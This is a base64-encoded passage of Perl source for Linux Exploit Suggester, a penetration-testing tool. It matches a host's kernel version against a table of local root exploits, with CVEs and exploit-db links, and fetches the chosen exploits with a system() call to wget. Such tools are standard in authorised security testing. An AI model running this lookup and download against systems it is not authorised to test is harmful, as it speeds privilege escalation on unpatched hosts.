AgICAgICAgIH0KICAgICAgICAgICAgZG93bmxvYWRfZXhwbG9pdHMoXEBzZWxlY3RlZCwgXEBhcHBsaWNhYmxlKTsKICAgICAgICAgICAgbGFzdDsKICAgICAgICB9CiAgICAgICAgZWxzaWYgKCRpbnB1dCA9fiAvXigwfFsxLTldWzAtOV0qKSgsKDB8WzEtOV1bMC05XSopKSokLykgewogICAgICAgICAgICBteSBAc2VsZWN0ZWQgPSB1bmlxKHNwbGl0KCcsJywgJGlucHV0KSk7CiAgICAgICAgICAgIEBzZWxlY3RlZCA9IHNvcnQgeyRhIDw9PiAkYn0gQHNlbGVjdGVkOwogICAgICAgICAgICBpZiAoJHNlbGVjdGVkWzBdID4gMCAmJiAkc2VsZWN0ZWRbLTFdIDw9IHNjYWxhciBAYXBwbGljYWJsZSkgewogICAgICAgICAgICAgICAgZG93bmxvYWRfZXhwbG9pdHMoXEBzZWxlY3RlZCwgXEBhcHBsaWNhYmxlKTsKICAgICAgICAgICAgICAgIGxhc3Q7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgIHByaW50ICIgIFxlWzAwOzMxbUlucHV0IGlzIG91dCBvZiByYW5nZS5cZVswMG0gU2VsZWN0IGV4cGxvaXRzIHRvIGRvd25sb2FkOiAiOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBwcmludCAiICBcZVswMDszMW1JbnZhbGlkIGlucHV0LlxlWzAwbSBTZWxlY3QgZXhwbG9pdHMgdG8gZG93bmxvYWQ6ICI7CiAgICAgICAgfQogICAgfQp9OwpleGl0OwoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyBleHRyYSBmdW5jdGlvbnMgICMjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCnN1YiBnZXRfa2VybmVsIHsKICAgIG15ICRraG9zdCA9ICcnOwoKICAgIGlmICggZXhpc3RzICRvcHRze2t9ICkgewogICAgICAgICRraG9zdCA9ICRvcHRze2t9OwogICAgfQogICAgZWxzZSB7CiAgICAgICAgJGtob3N0ID0gYHVuYW1lIC1yIHxjdXQgLWQiLSIgLWYxYDsKICAgICAgICBjaG9tcCAka2hvc3Q7CiAgICB9CgogICAgaWYgKCFkZWZpbmVkICRraG9zdCB8fCAhKCRraG9zdCA9fiAvXlswLTldKyhbLl1bMC05XSspKiQvKSkgewogICAgICAgIHByaW50ICIgIFxlWzAwOzMxbVNwZWNpZmllZCBrZXJuZWwgaXMgaW4gdGhlIHdyb25nIGZvcm1hdFxlWzAwbVxuIjsKICAgICAgICBwcmludCAiICBUcnkgYSBrZXJuZWwgZm9ybWF0IGxpa2UgdGhpczogMy4yLjBcblxuIjsKICAgICAgICBleGl0OwogICAgfQoKICAgICMgcGFydGlhbCBrZXJuZWxzIG1pZ2h0IGJlIHByb3ZpZGVkIGJ5IHRoZSB1c2VyLAogICAgIyBzdWNoIGFzICcyLjQnIG9yICcyLjYuJwogICAgbXkgJGlzX3BhcnRpYWwgPSAka2hvc3QgPX4gL15cZCtcLlxkK1wuXGQ/LyA/IDAgOiAxOwogICAgcmV0dXJuICggJGtob3N0LCAkaXNfcGFydGlhbCApOwp9CgpzdWIgZG93bmxvYWRfZXhwbG9pdHMgewogICAgbXkgKCRzcmVmLCAkYXJlZikgPSBAXzsKICAgIG15IEBzZWxlY3RlZCA9IEB7ICRzcmVmIH07CiAgICBteSBAYXBwbGljYWJsZSA9IEB7ICRhcmVmIH07CiAgICBteSAkZXhwbG9pdF9iYXNlID0gInd3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cyI7CiAgICBteSAkZG93bmxvYWRfYmFzZSA9ICJodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS9yYXcvIjsKICAgIHByaW50ICJcbiI7CgogICAgZm9yZWFjaCBteSAkbnVtIChAc2VsZWN0ZWQpIHsKICAgICAgICBteSAkbWlsID0gJGFwcGxpY2FibGVbJG51bS0xXXttaWx9OwogICAgICAgIG5leHQgaWYgKCFkZWZpbmVkICRtaWwpOwogICAgICAgIG15ICgkZXhwbG9pdF9udW0pID0gKCRtaWwgPX4gL14uKlwvKFsxLTldWzAtOV0qKVwvPyQvKTsKICAgICAgICAKICAgICAgICBpZiAoJGV4cGxvaXRfbnVtICYmIGluZGV4KCRtaWwsICRleHBsb2l0X2Jhc2UpICE9IC0xKSB7CiAgICAgICAgICAgIG15ICR1cmwgPSAkZG93bmxvYWRfYmFzZSAuICRleHBsb2l0X251bTsKICAgICAgICAgICAgbXkgJGZpbGUgPSAiZXhwbG9pdF8kYXBwbGljYWJsZVskbnVtLTFde2tleX0iOwogICAgICAgICAgICBwcmludCAiICBEb3dubG9hZGluZyBcZVswMDszM20kdXJsXGVbMDBtIC0+IFxlWzAwOzMzbSRmaWxlXGVbMDBtXG4iOwogICAgICAgICAgICBzeXN0ZW0gIndnZXQgJHVybCAtTyAkZmlsZSA+IC9kZXYvbnVsbCAyPiYxIjsKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHByaW50ICIgIE5vIGV4cGxvaXQgY29kZSBhdmFpbGFibGUgZm9yIFxlWzAwOzMzbSRhcHBsaWNhYmxlWyRudW0tMV17a2V5fVxlWzAwbVxuIjsgCiAgICAgICAgfQogICAgfQogICAgcHJpbnQgIlxuIjsKfQoKc3ViIHVuaXEgewogICAgbXkgJXNlZW47CiAgICBncmVwICEkc2VlbnskX30rKywgQF87Cn0KCnN1YiB1c2FnZSB7CnByaW50X2Jhbm5lcigpOwpwcmludCAiICBcZVswMDszNW1Vc2FnZTpcZVswMG0gJDAgWy1oXSBbLWsga2VybmVsXSBbLWRdXG5cbiI7CnByaW50ICIgIFxlWzAwOzMzbVtcZVswMG1cZVswMDszMW0taFxlWzAwbVxlWzAwOzMzbV1cZVswMG0gSGVscCAodGhpcyBtZXNzYWdlKVxuIjsKcHJpbnQgIiAgXGVbMDA7MzNtW1xlWzAwbVxlWzAwOzMxbS1rXGVbMDBtXGVbMDA7MzNtXVxlWzAwbSBLZXJuZWwgbnVtYmVyIChlZy4gMi42LjI4KVxuIjsKcHJpbnQgIiAgXGVbMDA7MzNtW1xlWzAwbVxlWzAwOzMxbS1kXGVbMDBtXGVbMDA7MzNtXVxlWzAwbSBPcGVuIGV4cGxvaXQgZG93bmxvYWQgbWVudVxuXG4iOwoKcHJpbnQgIiAgWW91IGNhbiBhbHNvIHByb3ZpZGUgYSBwYXJ0aWFsIGtlcm5lbCB2ZXJzaW9uIChlZy4gMi40KVxuIjsKcHJpbnQgIiAgdG8gc2VlIGFsbCBleHBsb2l0cyBhdmFpbGFibGUuXG5cbiI7Cn0KCnN1YiBwcmludF9iYW5uZXIgewpwcmludCAiXG5cZVswMDszM20gICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXGVbMDBtXG4iOwpwcmludCAiXGVbMTszMW0gICAgTGludXggRXhwbG9pdCBTdWdnZXN0ZXIgJFZFUlNJT05cZVswMG1cbiI7CnByaW50ICJcZVswMDszM20gICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXGVbMDBtXG5cbiI7Cn0KCnN1YiBnZXRfZXhwbG9pdHMgewogIHJldHVybiAoCiAgICAndzAwdCcgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi40LjEwJywgJzIuNC4xNicsICcyLjQuMTcnLCAnMi40LjE4JywKICAgICAgICAgICAgJzIuNC4xOScsICcyLjQuMjAnLCAnMi40LjIxJywKICAgICAgICBdCiAgICB9LAogICAgJ2JyaycgPT4gewogICAgICAgIHZ1bG4gPT4gWyAnMi40LjEwJywgJzIuNC4xOCcsICcyLjQuMTknLCAnMi40LjIwJywgJzIuNC4yMScsICcyLjQuMjInIF0sCiAgICB9LAogICAgJ2F2ZScgPT4geyB2dWxuID0+IFsgJzIuNC4xOScsICcyLjQuMjAnIF0gfSwKCiAgICAnZWxmbGJsJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbJzIuNC4yOSddLAogICAgICAgIG1pbCAgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNzQ0JywKICAgIH0sCgogICAgJ2VsZmR1bXAnICAgICAgPT4geyB2dWxuID0+IFsnMi40LjI3J10gfSwKICAgICdlbGZjZCcgICAgICAgID0+IHsgdnVsbiA9PiBbJzIuNi4xMiddIH0sCiAgICAnZXhwYW5kX3N0YWNrJyA9PiB7IHZ1bG4gPT4gWycyLjQuMjknXSB9LAoKICAgICdoMDBseXNoaXQnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi44JywgICcyLjYuMTAnLCAnMi42LjExJywgJzIuNi4xMicsCiAgICAgICAgICAgICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLAogICAgICAgIF0sCiAgICAgICAgY3ZlID0+ICcyMDA2LTM2MjYnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDEzJywKICAgIH0sCgogICAgJ2tkdW1wJyA9PiB7IHZ1bG4gPT4gWycyLjYuMTMnXSB9LAogICAgJ2ttMicgICA9PiB7IHZ1bG4gPT4gWyAnMi40LjE4JywgJzIuNC4yMicgXSB9LAogICAgJ2tyYWQnID0+CiAgICAgIHsgdnVsbiA9PiBbICcyLjYuNScsICcyLjYuNycsICcyLjYuOCcsICcyLjYuOScsICcyLjYuMTAnLCAnMi42LjExJyBdIH0sCgogICAgJ2tyYWQzJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuNScsICcyLjYuNycsICcyLjYuOCcsICcyLjYuOScsICcyLjYuMTAnLCAnMi42LjExJyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL2V4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzEzOTcnLAogICAgfSwKCiAgICAnbG9jYWwyNicgPT4geyB2dWxuID0+IFsnMi42LjEzJ10gfSwKICAgICdsb2tvJyAgICA9PiB7IHZ1bG4gPT4gWyAnMi40LjIyJywgJzIuNC4yMycsICcyLjQuMjQnIF0gfSwKCiAgICAnbXJlbWFwX3B0ZScgPT4gewogICAgICAgIHZ1bG4gPT4gWyAnMi40LjIwJywgJzIuMi4yNCcsICcyLjQuMjUnLCAnMi40LjI2JywgJzIuNC4yNycgXSwKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTYwJywKICAgIH0sCgogICAgJ25ld2xvY2FsJyA9PiB7IHZ1bG4gPT4gWyAnMi40LjE3JywgJzIuNC4xOScgXSB9LAogICAgJ29uZ19iYWsnICA9PiB7IHZ1bG4gPT4gWycyLjYuNSddIH0sCiAgICAncHRyYWNlJyA9PgogICAgICB7IHZ1bG4gPT4gWyAnMi40LjE4JywgJzIuNC4xOScsICcyLjQuMjAnLCAnMi40LjIxJywgJzIuNC4yMicgXSB9LAogICAgJ3B0cmFjZV9rbW9kJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjQuMTgnLCAnMi40LjE5JywgJzIuNC4yMCcsICcyLjQuMjEnLCAnMi40LjIyJyBdLAogICAgICAgIGN2ZSAgPT4gJzIwMDctNDU3MycsCiAgICB9LAogICAgJ3B0cmFjZV9rbW9kMicgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JywgJzIuNi4zMCcsICcyLjYuMzEnLAogICAgICAgICAgICAnMi42LjMyJywgJzIuNi4zMycsICcyLjYuMzQnLAogICAgICAgIF0sCiAgICAgICAgYWx0ID0+ICdpYTMyc3lzY2FsbCxyb2JlcnRfeW91X3N1Y2snLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTAyMycsCiAgICAgICAgY3ZlID0+ICcyMDEwLTMzMDEnLAogICAgfSwKICAgICdwdHJhY2UyNCcgPT4geyB2dWxuID0+IFsnMi40LjknXSB9LAogICAgJ3B3bmVkJyAgICA9PiB7IHZ1bG4gPT4gWycyLjYuMTEnXSB9LAogICAgJ3B5MicgICAgICA9PiB7IHZ1bG4gPT4gWyAnMi42LjknLCAnMi42LjE3JywgJzIuNi4xNScsICcyLjYuMTMnIF0gfSwKICAgICdyYXB0b3JfcHJjdGwnID0+IHsKICAgICAgICB2dWxuID0+IFsgJzIuNi4xMycsICcyLjYuMTQnLCAnMi42LjE1JywgJzIuNi4xNicsICcyLjYuMTcnIF0sCiAgICAgICAgY3ZlICA9PiAnMjAwNi0yNDUxJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMjAzMScsCiAgICB9LAogICAgJ3ByY3RsJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDA0JywKICAgIH0sCiAgICAncHJjdGwyJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDA1JywKICAgIH0sCiAgICAncHJjdGwzJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDA2JywKICAgIH0sCiAgICAncHJjdGw0JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDExJywKICAgIH0sCiAgICAncmVtYXAnICAgICAgPT4geyB2dWxuID0+IFsnMi40J10gfSwKICAgICdyaXAnICAgICAgICA9PiB7IHZ1bG4gPT4gWycyLjInXSB9LAogICAgJ3N0YWNrZ3JvdzInID0+IHsgdnVsbiA9PiBbICcyLjQuMjknLCAnMi42LjEwJyBdIH0sCiAgICAndXNlbGliMjQnID0+IHsKICAgICAgICB2dWxuID0+IFsgJzIuNi4xMCcsICcyLjQuMTcnLCAnMi40LjIyJywgJzIuNC4yNScsICcyLjQuMjcnLCAnMi40LjI5JyBdCiAgICB9LAogICAgJ25ld3NtcCcgICA9PiB7IHZ1bG4gPT4gWycyLjYnXSB9LAogICAgJ3NtcHJhY2VyJyA9PiB7IHZ1bG4gPT4gWycyLjQuMjknXSB9LAogICAgJ2xvZ2lueCcgICA9PiB7IHZ1bG4gPT4gWycyLjQuMjInXSB9LAogICAgJ2V4cC5zaCcgICA9PiB7IHZ1bG4gPT4gWyAnMi42LjknLCAnMi42LjEwJywgJzIuNi4xNicsICcyLjYuMTMnIF0gfSwKICAgICd2bXNwbGljZTEnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4xNycsICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywKICAgICAgICAgICAgJzIuNi4yMycsICcyLjYuMjQnLCAnMi42LjI0LjEnLAogICAgICAgIF0sCiAgICAgICAgYWx0ID0+ICdqZXNzaWNhIGJpZWwnLAogICAgICAgIGN2ZSA9PiAnMjAwOC0wNjAwJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNTA5MicsCiAgICB9LAogICAgJ3Ztc3BsaWNlMicgPT4gewogICAgICAgIHZ1bG4gPT4gWyAnMi42LjIzJywgJzIuNi4yNCcgXSwKICAgICAgICBhbHQgID0+ICdkaWFuZV9sYW5lJywKICAgICAgICBjdmUgID0+ICcyMDA4LTA2MDAnLAogICAgICAgIG1pbCAgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNTA5MycsCiAgICB9LAogICAgJ3Zjb25zb2xlJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbJzIuNiddLAogICAgICAgIGN2ZSAgPT4gJzIwMDktMTA0NicsCiAgICB9LAogICAgJ3NjdHAnID0+IHsKICAgICAgICB2dWxuID0+IFsnMi42LjI2J10sCiAgICAgICAgY3ZlICA9PiAnMjAwOC00MTEzJywKICAgIH0sCiAgICAnZnRyZXgnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4xMScsICcyLjYuMTInLCAnMi42LjEzJywgJzIuNi4xNCcsICcyLjYuMTUnLCAnMi42LjE2JywKICAgICAgICAgICAgJzIuNi4xNycsICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnMjAwOC00MjEwJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNjg1MScsCiAgICB9LAogICAgJ2V4aXRfbm90aWZ5JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy84MzY5JywKICAgIH0sCiAgICAndWRldicgPT4gewogICAgICAgIHZ1bG4gPT4gWyAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScgXSwKICAgICAgICBhbHQgID0+ICd1ZGV2IDwxLjQuMScsCiAgICAgICAgY3ZlICA9PiAnMjAwOS0xMTg1JywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvODQ3OCcsCiAgICB9LAoKICAgICdzb2NrX3NlbmRwYWdlMicgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi40LjQnLCAgJzIuNC41JywgICcyLjQuNicsICAnMi40LjcnLCAgJzIuNC44JywgICcyLjQuOScsCiAgICAgICAgICAgICcyLjQuMTAnLCAnMi40LjExJywgJzIuNC4xMicsICcyLjQuMTMnLCAnMi40LjE0JywgJzIuNC4xNScsCiAgICAgICAgICAgICcyLjQuMTYnLCAnMi40LjE3JywgJzIuNC4xOCcsICcyLjQuMTknLCAnMi40LjIwJywgJzIuNC4yMScsCiAgICAgICAgICAgICcyLjQuMjInLCAnMi40LjIzJywgJzIuNC4yNCcsICcyLjQuMjUnLCAnMi40LjI2JywgJzIuNC4yNycsCiAgICAgICAgICAgICcyLjQuMjgnLCAnMi40LjI5JywgJzIuNC4zMCcsICcyLjQuMzEnLCAnMi40LjMyJywgJzIuNC4zMycsCiAgICAgICAgICAgICcyLjQuMzQnLCAnMi40LjM1JywgJzIuNC4zNicsICcyLjQuMzcnLCAnMi42LjAnLCAgJzIuNi4xJywKICAgICAgICAgICAgJzIuNi4yJywgICcyLjYuMycsICAnMi42LjQnLCAgJzIuNi41JywgICcyLjYuNicsICAnMi42LjcnLAogICAgICAgICAgICAnMi42LjgnLCAgJzIuNi45JywgICcyLjYuMTAnLCAnMi42LjExJywgJzIuNi4xMicsICcyLjYuMTMnLAogICAgICAgICAgICAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JywgJzIuNi4xOCcsICcyLjYuMTknLAogICAgICAgICAgICAnMi42LjIwJywgJzIuNi4yMScsICcyLjYuMjInLCAnMi42LjIzJywgJzIuNi4yNCcsICcyLjYuMjUnLAogICAgICAgICAgICAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JywgJzIuNi4zMCcsCiAgICAgICAgXSwKICAgICAgICBhbHQgPT4gJ3Byb3RvX29wcycsCiAgICAgICAgY3ZlID0+ICcyMDA5LTI2OTInLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy85NDM2JywKICAgIH0sCgogICAgJ3NvY2tfc2VuZHBhZ2UnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNC40JywgICcyLjQuNScsICAnMi40LjYnLCAgJzIuNC43JywgICcyLjQuOCcsICAnMi40LjknLAogICAgICAgICAgICAnMi40LjEwJywgJzIuNC4xMScsICcyLjQuMTInLCAnMi40LjEzJywgJzIuNC4xNCcsICcyLjQuMTUnLAogICAgICAgICAgICAnMi40LjE2JywgJzIuNC4xNycsICcyLjQuMTgnLCAnMi40LjE5JywgJzIuNC4yMCcsICcyLjQuMjEnLAogICAgICAgICAgICAnMi40LjIyJywgJzIuNC4yMycsICcyLjQuMjQnLCAnMi40LjI1JywgJzIuNC4yNicsICcyLjQuMjcnLAogICAgICAgICAgICAnMi40LjI4JywgJzIuNC4yOScsICcyLjQuMzAnLCAnMi40LjMxJywgJzIuNC4zMicsICcyLjQuMzMnLAogICAgICAgICAgICAnMi40LjM0JywgJzIuNC4zNScsICcyLjQuMzYnLCAnMi40LjM3JywgJzIuNi4wJywgICcyLjYuMScsCiAgICAgICAgICAgICcyLjYuMicsICAnMi42LjMnLCAgJzIuNi40JywgICcyLjYuNScsICAnMi42LjYnLCAgJzIuNi43JywKICAgICAgICAgICAgJzIuNi44JywgICcyLjYuOScsICAnMi42LjEwJywgJzIuNi4xMScsICcyLjYuMTInLCAnMi42LjEzJywKICAgICAgICAgICAgJzIuNi4xNCcsICcyLjYuMTUnLCAnMi42LjE2JywgJzIuNi4xNycsICcyLjYuMTgnLCAnMi42LjE5JywKICAgICAgICAgICAgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsICcyLjYuMjQnLCAnMi42LjI1JywKICAgICAgICAgICAgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsICcyLjYuMzAnLAogICAgICAgIF0sCiAgICAgICAgYWx0ID0+ICd3dW5kZXJiYXJfZW1wb3JpdW0nLAogICAgICAgIGN2ZSA9PiAnMjAwOS0yNjkyJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvOTQzNScsCiAgICB9LAogICAgJ3VkcF9zZW5kbXNnXzMyYml0JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMScsICAnMi42LjInLCAgJzIuNi4zJywgICcyLjYuNCcsICAnMi42LjUnLCAgJzIuNi42JywKICAgICAgICAgICAgJzIuNi43JywgICcyLjYuOCcsICAnMi42LjknLCAgJzIuNi4xMCcsICcyLjYuMTEnLCAnMi42LjEyJywKICAgICAgICAgICAgJzIuNi4xMycsICcyLjYuMTQnLCAnMi42LjE1JywgJzIuNi4xNicsICcyLjYuMTcnLCAnMi42LjE4JywKICAgICAgICAgICAgJzIuNi4xOScsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMDktMjY5OCcsCiAgICAgICAgbWlsID0+CiAgICAgICAgICAnaHR0cDovL2Rvd25sb2Fkcy5zZWN1cml0eWZvY3VzLmNvbS92dWxuZXJhYmlsaXRpZXMvZXhwbG9pdHMvMzYxMDguYycsCiAgICB9LAogICAgJ3BpcGUuY18zMmJpdCcgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi40LjQnLCAgJzIuNC41JywgICcyLjQuNicsICAnMi40LjcnLCAgJzIuNC44JywgICcyLjQuOScsCiAgICAgICAgICAgICcyLjQuMTAnLCAnMi40LjExJywgJzIuNC4xMicsICcyLjQuMTMnLCAnMi40LjE0JywgJzIuNC4xNScsCiAgICAgICAgICAgICcyLjQuMTYnLCAnMi40LjE3JywgJzIuNC4xOCcsICcyLjQuMTknLCAnMi40LjIwJywgJzIuNC4yMScsCiAgICAgICAgICAgICcyLjQuMjInLCAnMi40LjIzJywgJzIuNC4yNCcsICcyLjQuMjUnLCAnMi40LjI2JywgJzIuNC4yNycsCiAgICAgICAgICAgICcyLjQuMjgnLCAnMi40LjI5JywgJzIuNC4zMCcsICcyLjQuMzEnLCAnMi40LjMyJywgJzIuNC4zMycsCiAgICAgICAgICAgICcyLjQuMzQnLCAnMi40LjM1JywgJzIuNC4zNicsICcyLjQuMzcnLCAnMi42LjE1JywgJzIuNi4xNicsCiAgICAgICAgICAgICcyLjYuMTcnLCAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsCiAgICAgICAgICAgICcyLjYuMjMnLCAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsCiAgICAgICAgICAgICcyLjYuMjknLCAnMi42LjMwJywgJzIuNi4zMScsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMDktMzU0NycsCiAgICAgICAgbWlsID0+CiAgICAgICAgICAnaHR0cDovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9kYXRhL3Z1bG5lcmFiaWxpdGllcy9leHBsb2l0cy8zNjkwMS0xLmMnLAogICAgfSwKICAgICdkb19wYWdlc19tb3ZlJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsCiAgICAgICAgICAgICcyLjYuMjQnLCAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsCiAgICAgICAgICAgICcyLjYuMzAnLCAnMi42LjMxJywKICAgICAgICBdLAogICAgICAgIGFsdCA9PiAnc2lldmUnLAogICAgICAgIGN2ZSA9PiAnMjAxMC0wNDE1JywKICAgICAgICBtaWwgPT4gJ1NwZW5kZXJzIEVubGlnaHRlbm1lbnQnLAogICAgfSwKICAgICdyZWlzZXJmcycgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsICcyLjYuMjMnLAogICAgICAgICAgICAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLAogICAgICAgICAgICAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTAtMTE0NicsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzEyMTMwJywKICAgIH0sCiAgICAnY2FuX2JjbScgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsICcyLjYuMjMnLAogICAgICAgICAgICAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLAogICAgICAgICAgICAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsICcyLjYuMzUnLAogICAgICAgICAgICAnMi42LjM2JywKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnMjAxMC0yOTU5JywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTQ4MTQnLAogICAgfSwKICAgICdyZHMnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4zMCcsICcyLjYuMzEnLCAnMi42LjMyJywgJzIuNi4zMycsCiAgICAgICAgICAgICcyLjYuMzQnLCAnMi42LjM1JywgJzIuNi4zNicsCiAgICAgICAgXSwKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTUyODUnLAogICAgICAgIGN2ZSA9PiAnMjAxMC0zOTA0JywKICAgIH0sCiAgICAnaGFsZl9uZWxzb24xJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMCcsICAnMi42LjEnLCAgJzIuNi4yJywgICcyLjYuMycsICAnMi42LjQnLCAgJzIuNi41JywKICAgICAgICAgICAgJzIuNi42JywgICcyLjYuNycsICAnMi42LjgnLCAgJzIuNi45JywgICcyLjYuMTAnLCAnMi42LjExJywKICAgICAgICAgICAgJzIuNi4xMicsICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JywKICAgICAgICAgICAgJzIuNi4xOCcsICcyLjYuMTknLCAnMi42LjIwJywgJzIuNi4yMScsICcyLjYuMjInLCAnMi42LjIzJywKICAgICAgICAgICAgJzIuNi4yNCcsICcyLjYuMjUnLCAnMi4